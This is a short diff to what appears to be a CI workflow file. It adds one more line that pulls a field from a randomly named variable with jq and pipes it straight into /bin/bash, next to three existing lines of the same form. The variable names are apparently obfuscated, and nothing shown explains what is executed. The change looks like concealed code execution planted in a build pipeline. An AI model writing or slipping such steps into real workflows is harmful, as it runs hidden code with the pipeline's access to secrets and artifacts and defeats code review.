@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$nxw61932" | jq -r .kozs35 | /bin/bash
           echo $kw3584 | jq -r .pd67 | /bin/bash
           echo $b21763 | jq -r .ygv387 | /bin/bash
+          echo $g95462 | jq -r .mt3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
